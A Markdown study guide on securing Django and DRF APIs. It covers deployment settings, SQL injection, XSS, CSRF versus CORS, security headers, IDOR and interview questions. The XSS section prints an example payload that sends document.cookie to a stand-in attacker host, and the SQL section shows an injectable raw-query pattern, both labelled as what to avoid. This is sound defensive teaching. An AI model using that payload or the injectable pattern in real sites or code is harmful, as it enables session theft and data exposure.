# Security

> Auth & tokens: **[auth.md](auth.md)** · Rate limiting: **[throttling.md](throttling.md)** ·
> General: **[../../CyberSecurity/](../../CyberSecurity/)**

---

## 1. The settings checklist ⭐

```python
DEBUG = False                                  # ⭐⭐ non-negotiable
SECRET_KEY = env("DJANGO_SECRET_KEY")          # ⭐ from env, rotated, never committed
ALLOWED_HOSTS = ["api.example.com"]            # ⚠️ not ["*"]

# HTTPS
SECURE_SSL_REDIRECT = True
SECURE_PROXY_SSL_HEADER = ("HTTP_X_FORWARDED_PROTO", "https")   # ⭐ behind nginx/ELB
SECURE_HSTS_SECONDS = 31536000                 # ⚠️ start small, then raise
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True

# Cookies
SESSION_COOKIE_SECURE   = True
CSRF_COOKIE_SECURE      = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = "Lax"

# Headers
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = "DENY"
```

```bash
python manage.py check --deploy       # ⭐ Django audits these for you
```

⚠️⚠️ **`DEBUG = True` in production** is the single most damaging misconfiguration: any
error page dumps settings, environment variables, SQL, and stack traces to the visitor, and
`ALLOWED_HOSTS` stops being enforced.

⚠️ **`SECURE_SSL_REDIRECT` without `SECURE_PROXY_SSL_HEADER`** behind a TLS-terminating proxy
causes an **infinite redirect loop** — nginx speaks HTTPS to the browser but HTTP to Django,
so Django sees an insecure request and redirects forever. Only trust that header when a proxy
you control actually sets it; otherwise a client can spoof it.

⚠️ **HSTS is hard to undo** — browsers remember it for `max_age`. Deploy with a small value
(e.g. 300), confirm, then raise.

---

## 2. SQL injection

```python
Product.objects.raw(f"SELECT * FROM p WHERE name = '{name}'")     # ⚠️ INJECTABLE
Product.objects.raw("SELECT * FROM p WHERE name = %s", [name])    # ⭐ parameterised
cursor.execute("... WHERE id = %s", [pk])
Product.objects.extra(where=[f"name = '{name}'"])                 # ⚠️ deprecated & unsafe
```

⭐ **The ORM parameterises everything** — `filter(name=name)` is always safe. Injection enters
through `raw()`, `extra()`, `RawSQL()`, and cursor calls with f-strings. Table and column
names **cannot** be parameterised, so if they come from user input, allow-list them.

⚠️ `filter(**request.GET.dict())` isn't injection but is an information-disclosure hole —
clients can filter on any field or relation ([filtering.md §4](filtering.md)).

---

## 3. XSS (Cross-Site Scripting)

An attacker gets their JavaScript to run in another user's browser:

```json
{"comment": "<script>fetch('https://evil.com/?c='+document.cookie)</script>"}
```

⭐ **Django templates auto-escape** `<`, `>`, `"`, `'`, `&` — you are safe by default. The
danger is opting out:

```django
{{ comment }}              {# ⭐ escaped #}
{{ comment|safe }}         {# ⚠️ raw — only for content YOU generated #}
{% autoescape off %}       {# ⚠️ #}
```

```python
mark_safe(user_input)          # ⚠️ never on user input
format_html("<b>{}</b>", x)    # ⭐ escapes the arguments
import bleach; bleach.clean(html, tags=[...])   # ⭐ sanitise rich text on INPUT
```

⚠️ **DRF/JSON APIs are not automatically safe** — DRF doesn't escape, and it shouldn't. The
escaping responsibility moves to the frontend. React escapes by default;
`dangerouslySetInnerHTML` is the equivalent hole. So a stored XSS payload passes through your
API untouched and detonates in the SPA.

⭐ **Defence in depth: Content-Security-Policy.** `default-src 'self'` stops injected inline
scripts from executing even if one slips through — `django-csp`. Modern security relies on
CSP; `SECURE_BROWSER_XSS_FILTER` (the legacy `X-XSS-Protection` header) is deprecated in
Chrome/Edge and kept only for old browsers.

⚠️ `HttpOnly` cookies protect the *session* from XSS, not the page — an attacker with script
execution can still act as the user via fetch.

---

## 4. CSRF vs CORS ⭐⭐

**Constantly confused, and a reliable interview discriminator.**

| | **CSRF** | **CORS** |
|---|---|---|
| What it is | ⭐ an **attack** | ⭐ a **browser permission mechanism** |
| Protects against | forged state-changing requests using your cookies | ⚠️ **nothing on its own** — it *relaxes* the same-origin policy |
| Enforced by | your server (token) | the **browser** |
| Applies to | any cookie-authenticated request, **including form posts** | ⭐ **only** cross-origin JS (fetch/XHR) |

**CSRF:** `evil.com` renders a hidden form posting to `yourbank.com/transfer`. The browser
attaches your session cookie automatically. Django's defence is a per-session token that
`evil.com` cannot read (same-origin policy) and must be echoed back.

⭐⭐ **CORS does not stop CSRF.** A plain `<form>` submission isn't subject to CORS at all —
the browser sends it and simply blocks *reading the response*. The damage is already done
server-side. Two different problems with two different fixes.

```python
CSRF_COOKIE_SECURE = True
CSRF_TRUSTED_ORIGINS = ["https://app.example.com"]      # ⭐ required in Django 4+
```

⚠️ **`@csrf_exempt` is almost always wrong.** For a webhook, verify the sender's **signature**
instead of disabling protection.

⭐ **Token-authenticated APIs (`Authorization: Bearer`) don't need CSRF protection** — the
browser doesn't attach that header automatically. But a JWT stored in a **cookie** does, since
cookies *are* sent automatically. That's the trade in [auth.md §3](auth.md).

```python
CORS_ALLOWED_ORIGINS = ["https://app.example.com"]     # ⚠️ never CORS_ALLOW_ALL_ORIGINS
CORS_ALLOW_CREDENTIALS = True                           # ⚠️ cannot combine with "*"
```

⭐ **`SameSite=Lax`** (Django's default) blocks cookies on cross-site POSTs, which mitigates
most CSRF at the browser level — but keep the token; not all clients honour it identically.

---

## 5. Other headers & clickjacking

| Setting | Header | Purpose |
|---|---|---|
| `X_FRAME_OPTIONS = "DENY"` | `X-Frame-Options` | ⭐ **clickjacking** — stops your page being framed by a malicious site that overlays invisible buttons |
| `SECURE_CONTENT_TYPE_NOSNIFF` | `X-Content-Type-Options: nosniff` | ⭐ stops browsers guessing `text/plain` is HTML and executing it |
| `SECURE_REFERRER_POLICY` | `Referrer-Policy` | avoid leaking URLs (with tokens) to third parties |
| `django-csp` | `Content-Security-Policy` | ⭐ the real XSS mitigation |
| — | `Permissions-Policy` | disable camera/geolocation APIs |

⭐ Modern replacement for `X-Frame-Options`: `Content-Security-Policy: frame-ancestors 'none'`.

---

## 6. Common Django-specific holes

| Hole | Fix |
|---|---|
| `fields = "__all__"` in a serializer | ⭐ list fields explicitly — new model fields auto-expose |
| Mass assignment (`is_staff` writable) | `read_only_fields`, set server-side in `perform_create` |
| **IDOR** — `/orders/5/` returns anyone's order | ⭐⭐ scope in `get_queryset()`, not just object permissions |
| Object permission on a **list** endpoint | ⭐ doesn't run — filter the queryset |
| Secrets in `settings.py` / git | env vars or a secret manager; rotate what leaked |
| User-controlled file paths | ⚠️ path traversal — validate, never `os.path.join(MEDIA, user_input)` |
| Unvalidated uploads | ⚠️ check type/size; serve user files from a **separate domain** |
| `pickle` in cache/session/task payloads | ⚠️ deserialisation RCE — use JSON |
| Open redirect (`?next=`) | ⭐ `url_has_allowed_host_and_scheme()` |
| User enumeration | identical responses/timing for unknown user vs wrong password |
| Verbose errors to clients | generic message + server-side log with a correlation id |
| No rate limit on login | [throttling.md](throttling.md) |

⭐⭐ **IDOR is the vulnerability most often found in Django APIs.** `get_object()` on an
unscoped queryset returns *any* row by id. The fix is one line in `get_queryset()`:

```python
def get_queryset(self):
    return Order.objects.filter(customer=self.request.user)     # ⭐ 404, not 403, for others
```

---

## 7. Dependencies & operations

```bash
pip-audit                      # ⭐ CVEs in installed packages
safety check
python manage.py check --deploy
```

⭐ **Keep Django on an LTS release and patch promptly** — Django security releases are
frequent and well-publicised, which means exploits follow quickly. Enable Dependabot.

**Logging & monitoring:** log auth failures, permission denials, and throttle hits with IP and
request id. ⚠️ **Never log passwords, tokens, card numbers, or full request bodies** —
Django's error reporter scrubs `password`-like keys, but your own log lines don't.

---

## 8. Interview points

- **CSRF vs CORS? ⭐⭐** CSRF is an attack (forged cookie-authenticated requests); CORS is a
  browser mechanism that *relaxes* same-origin for JS. CORS doesn't prevent CSRF — form posts
  bypass it entirely.
- **Do token-authenticated APIs need CSRF protection?** Not for `Authorization` headers
  (not sent automatically); yes if the token lives in a cookie.
- **How does Django prevent SQL injection, and how do you break it?** The ORM parameterises;
  `raw()`/`extra()`/cursor calls with f-strings reintroduce it.
- **How does Django prevent XSS, and where does it fail?** Template auto-escaping; `|safe`,
  `mark_safe`, and **JSON APIs consumed by a frontend** that renders unescaped.
- **What is clickjacking and the defence?** Invisible framing + overlay; `X-Frame-Options:
  DENY` or CSP `frame-ancestors`.
- **What does `DEBUG=True` leak?** Settings, env vars, SQL, tracebacks — and it disables host
  validation.
- **Why an infinite redirect loop after enabling SSL redirect?** Missing
  `SECURE_PROXY_SSL_HEADER` behind a TLS-terminating proxy.
- **What is IDOR and how do you prevent it? ⭐** Accessing another user's object by id; scope
  the queryset per user rather than relying on object permissions.
- **Where should a JWT live in a browser?** `HttpOnly` cookie (plus CSRF defence), not
  `localStorage`.
- **How do you handle secrets?** Environment variables or a secret manager, never in source;
  rotate immediately if leaked, since git history and CI logs retain them.
